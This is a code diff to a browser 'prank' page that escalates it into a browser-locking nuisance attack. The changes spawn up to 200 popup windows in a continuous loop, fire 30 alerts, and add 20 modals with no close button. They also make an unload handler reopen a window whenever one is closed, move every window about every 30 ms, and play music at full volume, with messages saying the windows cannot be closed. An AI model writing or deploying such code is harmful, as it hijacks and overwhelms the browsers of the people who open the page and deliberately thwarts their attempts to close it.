@@ -21,7 +21,7 @@
         const button = document.getElementById('prankButton');
         const music = document.getElementById('music');
         let popupCount = 0;
-        const maxPopups = 50;
+        const maxPopups = 200;
 
         const popupMessages = [
             "🎵 SURPRISE! 🎵",
@@ -46,12 +46,15 @@
             "🚀 BLAST OFF! 🚀"
         ];
 
+        const activePopups = [];
+
         function createPopup() {
             if (popupCount >= maxPopups) return;
             
-            const popup = window.open('', '_blank', 'width=300,height=200');
+            const popup = window.open('', '_blank', 'width=400,height=300');
             if (popup) {
                 popupCount++;
+                activePopups.push(popup);
                 const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
                 popup.document.write(`
                     <html>
@@ -85,62 +88,103 @@
                     <body>
                         <h1>${randomMessage}</h1>
                         <p style="color: white; text-align: center;">Popup #${popupCount} of ${maxPopups}</p>
+                        <p style="color: white; text-align: center; font-size: 12px;">You cannot close this window!</p>
                     </body>
                     </html>
                 `);
                 
+                // Make popup harder to close
+                popup.onbeforeunload = function() {
+                    return "Are you sure you want to leave?";
+                };
+                
+                // Try to prevent closing
+                popup.onunload = function() {
+                    window.open('', '_blank', 'width=400,height=300');
+                };
+                
                 // Position popup randomly
-                const randomX = Math.random() * (screen.width - 300);
-                const randomY = Math.random() * (screen.height - 200);
+                const randomX = Math.random() * (screen.width - 400);
+                const randomY = Math.random() * (screen.height - 300);
                 popup.moveTo(randomX, randomY);
             }
         }
 
-        function createAlerts() {
-            for (let i = 0; i < 10; i++) {
-                setTimeout(() => {
-                    const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
-                    alert(`${randomMessage}\n\nAlert #${i + 1} of 10`);
-                }, i * 500);
-            }
+        function movePopups() {
+            activePopups.forEach(popup => {
+                if (popup && !popup.closed) {
+                    const randomX = Math.random() * (screen.width - 400);
+                    const randomY = Math.random() * (screen.height - 300);
+                    popup.moveTo(randomX, randomY);
+                }
+            });
         }
 
-        function createModals() {
-            for (let i = 0; i < 5; i++) {
+        function createAlerts() {
+            for (let i = 0; i < 30; i++) {
                 setTimeout(() => {
-                    const modal = document.createElement('div');
-                    modal.className = 'modal';
-                    modal.style.left = Math.random() * 80 + 10 + '%';
-                    modal.style.top = Math.random() * 80 + 10 + '%';
-                    modal.innerHTML = `
-                        <div class="modal-content">
-                            <span class="close">&times;</span>
-                            <h2>${popupMessages[Math.floor(Math.random() * popupMessages.length)]}</h2>
-                            <p>Modal #${i + 1}</p>
-                        </div>
-                    `;
-                    document.body.appendChild(modal);
-                    
-                    modal.querySelector('.close').onclick = () => modal.remove();
+                    const randomMessage = popupMessages[Math.floor(Math.random() * popupMessages.length)];
+                    alert(`${randomMessage}\n\nAlert #${i + 1} of 30`);
                 }, i * 300);
             }
         }
 
+        const activeModals = [];
+
+        function createModals() {
+            for (let i = 0; i < 20; i++) {
+                setTimeout(() => {
+                    const modal = document.createElement('div');
+                    modal.className = 'modal moving-modal';
+                    modal.style.left = Math.random() * 80 + 10 + '%';
+                    modal.style.top = Math.random() * 80 + 10 + '%';
+                    modal.innerHTML = `
+                        <div class="modal-content">
+                            <h2>${popupMessages[Math.floor(Math.random() * popupMessages.length)]}</h2>
+                            <p>Modal #${i + 1} - Cannot be closed!</p>
+                        </div>
+                    `;
+                    document.body.appendChild(modal);
+                    activeModals.push(modal);
+                }, i * 200);
+            }
+        }
+
+        function moveModals() {
+            activeModals.forEach(modal => {
+                modal.style.left = Math.random() * 80 + 10 + '%';
+                modal.style.top = Math.random() * 80 + 10 + '%';
+            });
+        }
+
         button.addEventListener('click', () => {
-            // Play music
-            music.volume = 0.5;
+            // Play music at maximum volume
+            music.volume = 1.0;
             music.play().catch(e => console.log('Audio play failed:', e));
             
-            // Create multiple types of popups
-            for (let i = 0; i < 15; i++) {
-                setTimeout(createPopup, i * 200);
+            // Create massive amounts of popups
+            for (let i = 0; i < 100; i++) {
+                setTimeout(createPopup, i * 100);
             }
             
-            // Create alerts
-            setTimeout(createAlerts, 1000);
+            // Create alerts immediately
+            setTimeout(createAlerts, 500);
             
-            // Create modals
-            setTimeout(createModals, 2000);
+            // Create modals immediately
+            setTimeout(createModals, 300);
+            
+            // Keep spawning popups continuously
+            setInterval(() => {
+                if (popupCount < maxPopups) {
+                    createPopup();
+                }
+            }, 200);
+            
+            // Move popups extremely fast
+            setInterval(movePopups, 30);
+            
+            // Move modals extremely fast
+            setInterval(moveModals, 30);
             
             // Change button text
             button.textContent = '🎉 TOO LATE! 🎉';
